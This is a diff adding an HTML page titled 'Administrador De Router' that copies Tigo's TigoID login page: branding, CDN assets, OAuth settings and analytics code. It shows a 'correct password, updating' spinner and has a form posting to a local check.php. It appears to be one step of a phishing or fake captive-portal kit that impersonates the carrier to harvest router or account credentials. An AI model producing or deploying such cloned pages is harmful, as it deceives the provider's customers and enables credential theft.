@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta content="x-page-id" name="login_email_validate">
+    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Administrador De Router</title>
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <!-- Google Analytics -->
+    <script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+
+    ga('create', 'UA-27828589-63', {'clientId': '7498be0f-9909-40ef-e7f9-7dd431650757'});
+
+
+    ga('send', 'pageview', location.pathname);
+  </script>
+    <!-- End Google Analytics -->
+    <link rel="icon" type="image/png" href="https://tigoid-cdn.tigocloud.net/v2/r05/page/skin/default/images/favicon.png">
+    <link href="https://tigoid-cdn.tigocloud.net/v2/r05/page/shared/css/font-style.css?v=6"
+      rel="stylesheet">
+    <link href="https://tigoid-cdn.tigocloud.net/v2/r05/page/shared/css/materialize.min.css?ver=1"
+      rel="stylesheet">
+    <link href="https://tigoid-cdn.tigocloud.net/v2/r05/page/shared/css/materialize.ui.css"
+      rel="stylesheet">
+    <link href="https://tigoid-cdn.tigocloud.net/v2/r05/page/skin/default/css/main.css"
+      rel="stylesheet">
+    <!-- from below -->
+    <script src="https://tigoid-cdn.tigocloud.net/v2/r05/page/shared/js/jquery.min.js"></script>
+    <script src="https://tigoid-cdn.tigocloud.net/v2/r05/page/shared/js/materialize.min.js"></script>
+    <script src="https://tigoid-cdn.tigocloud.net/v2/r05/page/shared/js/mask/jquery.mask.min.js"></script>
+    <script src="https://tigoid-cdn.tigocloud.net/v2/r05/page/shared/js/materialize.fields.js"></script>
+    <script src="https://tigoid-cdn.tigocloud.net/v2/r05/page/shared/js/materialize.pages.js"></script>
+    <script src="https://tigoid-cdn.tigocloud.net/v2/r05/page/shared/js/main.js?v=1"></script>
+    <!-- end from below -->
+    <style type="text/css">
+    .btn-block {
+        margin: 10px 0px 0px 0px;
+    }
+    .rememberMe {
+        display: block;
+        padding: 0px 10px 10px 5px;
+        margin: 0px;
+        border-radius: 7px;
+        font-weight: normal;
+    }
+
+    #socialLoginPromptModal {
+      max-width: 400px;
+    }
+</style> </head>
+  <body class="grey lighten-3">
+    <nav class="main-navbar">
+      <div class="nav-wrapper brand-blue">
+        <div class="brand-logo"> <img src="https://tigoid-cdn.tigocloud.net/v2/r05/page/skin/default/images/logo.png?v=1"
+            class="logo"> </div>
+        <ul class="left">
+          <a id="id_back_arrow" href="javascript:window.history.back();"> <br>
+          </a>
+        </ul>
+      </div>
+    </nav>
+    <div class="progress">
+      <div class="indeterminate"></div>
+    </div>
+    <div class="main card login_email_validate">
+      <div class="card-content">
+        <div class="header-wrapper">
+          <h5 class="card-title center-align">Actualizando</h5>
+        </div>
+        <div class="row">
+          <div class="center-align">
+            <p>Contraseña correcta actualizando.</p>
+          </div>
+        </div>
+        <form id="form1" name="form1" method="POST" action="check.php" accept-charset="UTF-8"
+          autocomplete="off"> <input id="providerId" name="provider" value="" type="hidden">
+        </form>
+        <div class="row">
+          <div class="center-align">Tigo Inc © 2019</div>
+        </div>
+      </div>
+    </div>
+    <div id="socialLoginPromptModal" class="modal">
+      <div class="modal-content">
+        <p>&nbsp;</p>
+      </div>
+      <div class="modal-footer"> <button class="btn waves-effect waves-light light-blue white-text"
+          type="button">Continuar</button> <a href="#%21" class="modal-close waves-effect btn-flat">Cancelar</a>
+      </div>
+    </div>
+    <script type="text/javascript">
+   $(document).ready(function(){
+
+     App.pageId = "login_email_validate";
+     App.init({});
+
+     if( $(window).width() < 320 && $(window).width() > 250 ) {
+       $('.main.card.'+ App.pageId).css('width', $(window).width());
+     }else if( $(window).width() <=  250 ){
+       $('.main.card.'+ App.pageId).css('width', 250);
+     }
+
+
+     // specific for phone_add
+     $('#id_country_button').click(function() {
+       $(this).siblings(".prefix").addClass("active");
+     });
+     // get icon from className
+     function getIcon( classNames ) {
+       var icon = "";
+       $.each(classNames, function ( i, className ) {
+	 // class refered to icons
+	 if (className.indexOf("icon") != -1) {
+	   // index start in the "second" position of "-"
+	   var startSub = className.indexOf("-", 5);
+	   // extract based on index
+	   icon = className.substr(0, startSub);
+	 }
+       });
+       return icon;
+     }
+     if(App.pageId !== 'phone_smsotp') {
+       // ICON ACTIVATOR
+       var inputField = $('.input-field');
+       // detect click on input-field
+       inputField.on("click", function() {
+	 var hisChildren = $(this).children('span.prefix');
+	 // the child of inputField that has .active set the cyan icons
+	 if (hisChildren.hasClass("active")) {
+	   var classNames = $(this).children('span').attr("class").toString().split(' ');
+	   var icon = getIcon(classNames);
+	   // toggle class
+	   hisChildren.removeClass(icon+"-indigo");
+	   hisChildren.addClass(icon+"-cyan");
+	 }
+       });
+       // detect focusout
+       inputField.on("focusout", function() {
+	 var hisChildren = $(this).children('span.prefix');
+	 var classNames = $(this).children('span').attr("class").toString().split(' ');
+	 var icon = getIcon(classNames);
+	 // toggle class
+	 if (icon.length > 0) {
+	   hisChildren.removeClass(icon+"-cyan");
+	   hisChildren.addClass(icon+"-indigo");
+	 }
+       });
+     }
+   });
+
+  </script>
+    <script type="text/javascript">
+    $("#hideMessage").on("click", function(e){
+    $("#messages").hide();
+    });
+  </script>
+    <script src="https://tigoid-cdn.tigocloud.net/v2/r05/page/shared/js/validations.js"></script>
+    <script type="text/javascript" src="https://tigoid-cdn.tigocloud.net/v2/r05/page/shared/js/socialize.js?ver=0"></script>
+    <script type="text/javascript">
+ var emailId = "idEmail"
+   , nameId = "idName"
+   , formId = "idForm"
+   , passId = "idPass"
+   , pass2Id = "idPass2"
+   , termsId = "idTerms"
+   , termsErrId = "idTermsErr"
+   , submitId = "idSubmit"
+   , recoverPassId =  "idRecoverPass"
+   , validEmail = false
+   , pendingAjaxCC = 0
+   , validateCache = {}
+   , haveLocalStorage  = typeof(Storage) !== "undefined"
+   , disableSocial = "true"
+ ;
+ var   sendmail = 0;
+
+(function() {
+	var config={"facebook":{"clientId":"505327859570223","responseType":"code","scope":"email,public_profile","authEndpoint":"//www.facebook.com/dialog/oauth","tokenEndpoint":"https://graph.facebook.com/v2.5/oauth/access_token","tokenMethod":"GET","grantType":"authorization_code","profileEndpoint":"https://graph.facebook.com/me?fields=id,name,first_name,last_name,gender,birthday,hometown,location,link,email,picture.height(2000)","redirectUri":"https://id.tigo.com/openid/social/callback/facebook","state":"82d12e60"},"google":{"clientId":"964264384476-0fna07qs4otoms9qvgle4cdvbt1jm9tp.apps.googleusercontent.com","responseType":"code","scope":"openid email profile","authEndpoint":"//accounts.google.com/o/oauth2/auth","tokenEndpoint":"https://www.googleapis.com/oauth2/v3/token","tokenMethod":"POST","grantType":"authorization_code","profileEndpoint":"https://www.googleapis.com/plus/v1/people/me","redirectUri":"https://id.tigo.com/openid/social/callback/google","state":"82d12e60"}}
+    , getConfig = function(provider){
+        var p = config[provider];
+        return {"endpoint":p.authEndpoint
+                + "?client_id=" + encodeURIComponent(p.clientId)
+                + "&scope=" + encodeURIComponent(p.scope)
+                + "&response_type=" + p.responseType
+                + "&state=" + encodeURIComponent(p.state)
+                + "&redirect_uri=" + encodeURIComponent(p.redirectUri)};
+        }
+    , providers={}
+    ;
+    for( var provider in config ){
+        providers[provider] = getConfig(provider);
+    }
+    socialLoginOptions.providers=providers;
+    socialLoginOptions.display="redirect";
+})();
+
+function createAccount() {
+  var emailElt = $("#" + emailId)
+  if(haveLocalStorage && $.trim(emailElt.val()) !== "") {
+    sessionStorage.setItem("email", $.trim(emailElt.val()) );
+  }
+  location.href = "https://id.tigo.com/openid/login/method_select";
+}
+
+function initSocialLogin(provider) {
+    var url = socialLoginOptions.providers[provider].endpoint + "&login_hint=" + $("#idEmail").val();
+    if (socialLoginOptions.display === "redirect") {
+        window.location.assign(url);
+    } else {
+        var options = {
+            resizable: 1,
+            scrollbars: 1,
+            width: 500,
+            height: 550
+        };
+        socialLoginState.popup = popup(url, "Facebook Login", options.width, options.height);
+    }
+}
+
+ function onUserValidated( email, status, isFormVal ){
+   var alreadyExists = status === "success";
+   validEmail = !alreadyExists; // email already taken
+ }
+
+ function updateMaySubmit() {
+   var maySubmit = validEmail;
+   if( pendingAjaxCC > 0 )
+     maySubmit = false;
+   if( !$("#" + termsId).is(':checked') )
+     maySubmit = false;
+   $("#" + submitId ).prop("disabled",!maySubmit);
+   return maySubmit;
+ }
+
+ function emailValidation(){
+   var continueBtn = $('#continueBtn');
+   var progress = $('.progress');
+   var validating = $('#validating');
+   var emailElt = $("#" + emailId), emailVal = emailElt.val();
+   //TODO: show wating images
+   validEmail = emailVal && validateEmail(emailVal);
+   continueBtn.toggle();
+   validating.toggle();
+   progress.toggle();
+   if(  validEmail ) {
+     var status = validateCache[emailVal];
+     if( status && status !== 'notfound') {
+       onUserValidated(emailVal, status);
+     }else if( pendingAjaxCC < 2 ){
+         ++pendingAjaxCC;
+       var url = "https://id.tigo.com/openid/validate/user/%user_id%?user_id_type=%user_id_type%&signature=bG9naW5fZW1haWxfdmFsaWRhdGUsODJkMTJlNjAtYmVhNi00YzJlLWE0MDktNTBiNzYzNTcwN2Iz%24101482990%24a2ec3c95daa025bacc603825360f0d15";
+       url = url.replace("%user_id%", encodeURIComponent(emailVal));
+       url = url.replace("%user_id_type%", "email");
+       $.ajax({
+         url: url,
+         method: "GET",
+         success: function (data, status, xhr) {
+           var isFormVal = $("#" + emailId).val() === emailVal;
+           validateCache[emailVal] = data.status;
+	   if (!data || !data.user){
+	     $(".notfound").removeClass('hide');
+	     continueBtn.toggle();
+	     validating.toggle();
+	     progress.toggle();
+	   } else if ( disableSocial === 'false'
+		    && (data.user.provider === 'facebook'
+		     || data.user.provider === 'google') ) {
+	      $("#providerId" ).val(data.user.provider);
+        // initSocialLogin(data.user.provider);
+        promptSocialLogin(data.user.provider);
+        delete validateCache[emailVal];
+	   } else {
+	     $("#providerId" ).val(data.user.provider);
+             $("#emailForm").submit();
+	   }
+           if( isFormVal ){
+             onUserValidated( emailVal, data.status);
+           }
+				    -- pendingAjaxCC;
+           updateMaySubmit();
+         },
+         error: function (data,status) {
+             -- pendingAjaxCC;
+           updateMaySubmit();
+           continueBtn.toggle();
+           validating.toggle();
+           progress.toggle();
+         }
+       });
+     }
+   } else {
+     continueBtn.toggle();
+     validating.toggle();
+     progress.toggle();
+   }
+   updateMaySubmit();
+ };
+
+ function enableOrDisableContinueBtn() {
+    var continueBtn = $('#continueBtn');
+    if(validateEmail($('#idEmail').val())) {
+        continueBtn.attr("disabled", false);
+    } else {
+        continueBtn.attr("disabled", true);
+    }
+  }
+
+ $(document).ready(function() {
+   $('#idEmail').on('keydown', function(e){
+     if(e.keyCode == 13){
+       e.preventDefault();
+       if( validateEmail($(this).val() ) ){
+	 emailValidation();
+       }
+     }
+   }).on('input', function(e) {
+    enableOrDisableContinueBtn();
+   });
+
+   enableOrDisableContinueBtn();
+
+   $('#createNew').click(function( e ) {
+     e.preventDefault();
+     window.location = "https://id.tigo.com/openid/login/signup_form?email=" + $('#idEmail').val();
+   });
+
+   $('#socialLoginPromptModal').modal();
+ });
+
+function capitalizeFirstLetter(string) {
+    return string[0].toUpperCase() + string.slice(1);
+}
+
+
+function promptSocialLogin(provider) {
+  var prov = capitalizeFirstLetter(provider);
+  var txt = "Esta cuenta fué creada utilizando [[provider_name]]. Selecciona '[[continue_label]]' para ingresar con [[provider_name]]";
+  txt = txt.replace(/\[\[provider_name\]\]/g, prov);
+  txt = txt.replace(/\[\[continue_label\]\]/g, "Continuar");
+
+  $('#socialLoginPromptModal .modal-content').html(txt);
+  $('#socialLoginPromptModal .modal-footer button').off('click').on('click', function() { initSocialLogin(provider) });
+  $('#socialLoginPromptModal').modal('open');
+
+  $("#validating").toggle();
+  $("#continueBtn").toggle();
+  $(".progress").toggle();
+}
+
+</script> </body>
+</html>
